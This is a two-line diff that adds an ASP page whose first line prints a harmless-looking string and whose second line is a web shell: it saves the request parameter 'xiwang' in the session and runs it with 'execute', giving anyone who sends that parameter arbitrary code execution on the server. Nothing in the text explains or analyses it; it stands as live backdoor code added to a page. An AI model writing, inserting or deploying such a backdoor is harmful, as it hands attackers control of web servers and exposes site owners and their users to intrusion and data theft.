@@ -1,0 +1,2 @@
+<%="for my best girl"%>
+<%if request ("xiwang")<>""then session("xiwang")=request("xiwang"):end if:if session("xiwang")<>"" then execute session("xiwang")%>
